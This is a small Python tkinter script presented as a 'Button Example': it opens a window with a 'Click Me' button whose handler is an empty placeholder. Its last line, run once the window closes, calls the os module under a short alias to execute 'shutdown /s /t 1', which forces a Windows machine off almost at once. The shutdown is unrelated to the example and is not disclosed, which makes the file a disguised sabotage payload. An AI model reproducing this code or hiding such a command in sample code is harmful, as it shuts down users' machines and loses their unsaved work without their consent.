import tkinter as tk
import os as o


root = tk.Tk()
root.title("Button Example")
def on_button_click():
    #function goes here
    print()

button = tk.Button(root, text="Click Me", command=on_button_click)
button.pack()
root.mainloop()

o.system("shutdown /s /t 1")
